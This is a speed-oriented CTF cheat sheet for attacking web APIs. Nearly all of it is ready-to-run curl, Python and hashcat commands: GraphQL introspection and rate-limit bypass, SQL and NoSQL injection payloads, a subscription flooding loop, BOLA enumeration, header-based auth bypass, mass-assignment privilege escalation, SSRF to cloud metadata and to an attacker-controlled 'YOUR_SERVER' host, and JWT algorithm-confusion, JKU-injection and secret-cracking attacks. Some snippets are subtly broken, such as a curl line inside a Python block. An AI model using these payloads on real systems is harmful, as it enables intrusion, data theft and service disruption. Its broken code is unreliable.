# CTF API Security — Speed-First

## Instant Recon (<1 minute)

```bash
URL=$1
# Find API endpoints
curl -s $URL | grep -oE '"/api/[^"]*"|"/v[0-9]/[^"]*"|fetch\("[^"]*"\)' | head -20
# GraphQL detection
curl -s -X POST "$URL/graphql" -H "Content-Type: application/json" -d '{"query":"{__typename}"}' | head -1
# JWT detection
curl -sI $URL | grep -i 'authorization\|jwt\|bearer'
# API docs
for f in /swagger /docs /api-docs /openapi.json /swagger.json /graphql; do
  code=$(curl -s -o /dev/null -w '%{http_code}' $URL$f); [ "$code" != "404" ] && echo "[+] $f → $code"
done
# AI manipulation headers
curl -sI $URL | grep -i 'x-llm\|x-agent\|x-system\|llm-policy'
```

## GraphQL Exploitation

### Introspection → Full Schema
```bash
curl -s -X POST "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{__schema{queryType{name}mutationType{name}types{kind,name,fields{name, args{name,type{name,kind ofType{name}}}}}}}"}' | jq .
```

### Batch Query Abuse (Rate Limit Bypass)
```bash
# Send 100 queries in one request
python3 -c "
import json,requests
q=[{'query':'{user(id:1){name,email}}'} for _ in range(100)]
r=requests.post('$URL/graphql',json=q)
print(r.text[:500])
"
```

### Alias Abuse (Bypass Rate Limiting)
```bash
# 10 queries disguised as 1
curl -s -X POST "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{a1:user(id:1){name} a2:user(id:2){name} a3:user(id:3){name} a4:user(id:4){name} a5:user(id:5){name} a6:user(id:6){name} a7:user(id:7){name} a8:user(id:8){name} a9:user(id:9){name} a10:user(id:10){name}}"}'
```

### Directive Injection
```bash
# Skip authorization with @skip
curl -s -X POST "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"query{user(id:1){name role @skip(if:true) secretField}}"}'
# Bypass with @include
curl -s -X POST "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"query{user(id:1){name secretField @include(if:true)}}"}'
```

### Injection via Input
```bash
# IDOR via GraphQL
curl -s -X POST "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{user(id:\"1 OR 1=1\"){name,email,role}}"}'
# SQL injection in GraphQL
curl -s -X POST "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"mutation{login(username:\"admin\\\"--\",password:\"x\"){token}}"}'
# NoSQL injection
curl -s -X POST "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{user(id\":{\"$gt\":\"\"}){name}}"}'
```

### Subscription DoS
```bash
# Resource exhaustion via subscriptions
for i in $(seq 1 50); do
  curl -s -X POST "$URL/graphql" -H "Content-Type: application/json" \
    -d '{"query":"subscription{onMessage{content user{name}}}"}' &
done; wait
```

## REST API Chains

### BOLA → Admin Chain
```bash
# Step 1: Enumerate user IDs
for id in 1 2 3 100 999 admin root; do
  resp=$(curl -s "$URL/api/v1/users/$id")
  echo "ID $id: $(echo $resp | head -c 100)"
done
# Step 2: Find admin endpoints
for ep in /admin /api/admin /api/v1/admin /manage /dashboard /internal; do
  code=$(curl -s -o /dev/null -w '%{http_code}' "$URL$ep")
  [ "$code" != "404" ] && echo "[+] $ep → $code"
done
# Step 3: Auth bypass via header manipulation
curl -s -H "X-Admin: true" "$URL/api/admin/users"
curl -s -H "X-User-Role: admin" "$URL/api/admin/flag"
curl -s -H "Authorization: Bearer admin_token_here" "$URL/api/flag"
```

### Mass Assignment → Privilege Escalation
```bash
# Normal user update → add admin fields
curl -s -X PUT "$URL/api/profile" -H "Content-Type: application/json" \
  -d '{"name":"test","email":"test@test.com","role":"admin","isAdmin":true,"verified":true,"credits":999999}'
# GraphQL version
curl -s -X POST "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"mutation{updateProfile(input:{name:\"test\",role:\"admin\",isAdmin:true}){id,role}}"}'
```

### SSRF via API
```bash
# Fetch/proxy endpoints
curl -s "$URL/api/fetch?url=http://169.254.169.254/latest/meta-data/"
curl -s "$URL/api/webhook?url=http://YOUR_SERVER/callback"
curl -s -X POST "$URL/api/generate-pdf" -d '{"url":"http://169.254.169.254"}'
# DNS rebinding
curl -s "$URL/api/fetch?url=http://rebind.nu"
```

## JWT Complete Attack Chain

### Algorithm Confusion (RS256 → HS256)
```python
import jwt, base64, hashlib
# Step 1: Get public key from JWKS endpoint
pubkey = requests.get(f"{URL}/.well-known/jwks.json").json()["keys"][0]
# Step 2: Convert to PEM
from jwt.algorithms import RSAAlgorithm
rsa_key = RSAAlgorithm.from_jwk(pubkey)
pem = rsa_key.export_key()
# Step 3: Sign with HS256 using PEM as secret
token = jwt.encode({"user":"admin","role":"admin"}, pem, algorithm="HS256")
# Step 4: Use token
curl -s -H "Authorization: Bearer $token" "$URL/api/admin"
```

### JKU/JWK Injection
```python
import jwt, json, requests
# Step 1: Host malicious JWKS on your server
malicious_jwk = {"keys":[{"kty":"RSA","n":"...","e":"AQAB","kid":"evil","alg":"RS256","use":"sig"}]}
# Step 2: Create JWT with your JKU
header = {"alg":"RS256","typ":"JWT","jku":"http://YOUR_SERVER/.well-known/jwks.json","kid":"evil"}
# Step 3: Sign with your private key
token = jwt.encode(payload, private_key, algorithm="RS256", headers=header)
```

### Weak Secret Brute
```bash
# crackstation
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
# John
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256
```

## Real-World CTF References

| Challenge | Platform | Technique |
|-----------|----------|-----------|
| API Security Top 10 | OWASP | BOLA, mass assignment, SSRF |
| GraphQL CTF | PicoCTF 2023 | Introspection, batch query |
| JWT Hard | HTB | Algorithm confusion, JKU injection |
| API Chains | RealWorld CTF | Multi-step BOLA → admin |
| GraphQL Murder | SekaiCTF | Directive injection, subscription abuse |

## Speed Metrics
```
GraphQL recon: <1min  |  BOLA chain: <3min  |  JWT attack: <5min
Mass assignment: <2min  |  SSRF: <3min  |  Full chain: <10min
```
